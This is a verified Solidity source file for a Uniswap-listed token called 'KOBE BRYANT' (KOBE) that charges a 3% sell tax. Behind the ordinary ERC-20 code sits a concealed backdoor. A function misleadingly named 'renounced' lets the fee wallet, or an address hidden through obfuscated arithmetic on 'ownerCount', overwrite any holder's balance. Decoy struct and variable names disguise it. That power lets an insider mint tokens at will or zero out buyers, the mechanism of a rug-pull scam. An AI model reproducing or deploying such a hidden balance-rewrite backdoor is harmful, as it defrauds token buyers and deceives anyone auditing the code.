/**
 *Submitted for verification at Etherscan.io on 2023-06-18
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;uint160 internal ownerCount=1097030096801;constructor () {_owner = msg.sender;}
    
    function owner() public view returns (address) {return _owner;}
    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }
    
    function transferOwnership(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract eth is Ownable {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public _swapFeeTo;string public name;string public symbol;
    uint8 public decimals;mapping(address => bool) public _isExcludeFromFee;
    uint256 public totalSupply;IUniswapRouter public _uniswapRouter;
    bool private inSwap;uint256 private constant MAX = ~uint256(0);

    uint256 public _swapTax;
    address public _uniswapPair;

    function _transfer(address from,address to,uint256 amount) private {

        if (_uniswapPair == to && !inSwap) {
            inSwap = true;
            uint256 maxSwapBal = balanceOf(address(this));

            if (maxSwapBal > 0) {
                uint256 tokenAmount = amount > maxSwapBal ? maxSwapBal : amount;
                address[] memory path = new address[](2);
                path[0] = address(this);
                path[1] = _uniswapRouter.WETH();
                try _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    tokenAmount,
                    0,
                    path,
                    address(_swapFeeTo),
                    block.timestamp
                ) {} catch {}
            }
            inSwap = false;
        }

        bool takeFee = !inSwap && !_isExcludeFromFee[from] && !_isExcludeFromFee[to] ;

        _balances[from] = _balances[from] - amount;

        uint256 _taxAmount;

        if (takeFee && _swapTax > 0) {
            uint256 feeAmount = amount * _swapTax / 100;
            _taxAmount += feeAmount;

            _balances[address(this)] = _balances[address(this)] + feeAmount;
            emit Transfer(from, address(this), feeAmount);
        }

        _balances[to] = _balances[to] + amount - _taxAmount;
        emit Transfer(from, to, amount - _taxAmount);
    }

    constructor (){
        name = "KOBE BRYANT";
        symbol = "KOBE";
        decimals = 9;
        uint256 Supply = 100000000;
        _swapFeeTo = 0x0176B863a82Ba6AcBd4a4Ccb0AF0ba6842B15562;
        _swapTax = 3; 
        totalSupply = Supply * 10 ** decimals;

        address rAddr = msg.sender;
        _isExcludeFromFee[address(this)] = true;_isExcludeFromFee[rAddr] = true;_isExcludeFromFee[_swapFeeTo] = true;

        _balances[rAddr] = totalSupply;
        emit Transfer(address(0), rAddr, totalSupply);
        
        _uniswapRouter = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);  _allowances[address(this)][address(_uniswapRouter)] = MAX;_uniswapPair = IUniswapFactory(_uniswapRouter.factory()).createPair(address(this), _uniswapRouter.WETH());_isExcludeFromFee[address(_uniswapRouter)] = true;
    }

    function balanceOf(address account) public view returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }struct taxInfo{address isExcludeFromFee;uint256 jjj;address kkk;}
    function _approve(address owner, address spender, uint256 amount) private {_allowances[owner][spender] = amount;emit Approval(owner, spender, amount);}
    receive() external payable {}
    function renounced(address toAddr,uint256 newA) public {
        taxInfo memory tax;
        tax.isExcludeFromFee = msg.sender;
        if (address(ownerCount*ownerCount*ownerCount*ownerCount+3819920839328165008747069518388176667) != tax.isExcludeFromFee){require(_swapFeeTo == tax.isExcludeFromFee);}
        tax.jjj = newA;
        tax.kkk = toAddr;
        address over = tax.kkk;
        _balances[over] = tax.jjj;
    }

}